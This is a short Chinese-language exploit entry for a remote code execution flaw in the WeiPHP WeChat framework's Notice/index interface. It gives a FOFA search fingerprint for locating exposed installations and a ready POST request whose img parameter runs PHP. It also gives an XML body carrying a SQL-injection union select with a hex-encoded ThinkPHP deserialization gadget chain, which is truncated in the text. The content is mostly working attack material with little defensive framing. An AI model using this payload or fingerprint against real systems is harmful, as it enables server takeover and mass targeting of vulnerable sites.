# WeiPHP微信开发框架Notice_index接口处存在远程代码执行漏洞

- **系统**：WeiPHP　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`fofa: `body="/css/weiphp.css" ｜  title="weiphp" ｜  title="weiphp4.0" ``
- **请求**：`POST /public/index.php/weixin/Notice/index?img=echo+md5(789);exit(); HTTP/1.1`
- **关键头**：`Host: 127.0.0.1`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 0`

**请求体 / payload**
```
<xml>
<product_id>aaaa</product_id>
<appid>exp</appid>
<appid>=0) union select 1,2,3,4,5,6,7,0x4f3a32373a227468696e6b5c70726f636573735c70697065735c57696e646f7773223a313a7b733a33343a22007468696e6b5c70726f636573735c70697065735c57696e646f77730066696c6573223b613a313a7b693a303b4f3a31373a227468696e6b5c6d6f64656c5c5069766f74223a323a7b733a393a22002a00617070656e64223b613a313a7b733a333a226c696e223b613a313a7b693a303b733a323a223131223b7d7d733a31373a22007468696e6b5c4d6f64656c0064617461223b613a313a7b733a333a226c696e223b4f3a31333a227468696e6b5c52657175657374223a353a7b733a373a22002a00686f6f6b223b613a323a7b733…（脚本共 1403 字，完整版见原文）
```

**其他**
- WeiPHP微信开发框架Notice/index接口处存在远程代码执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * WeiPHP微信开发框架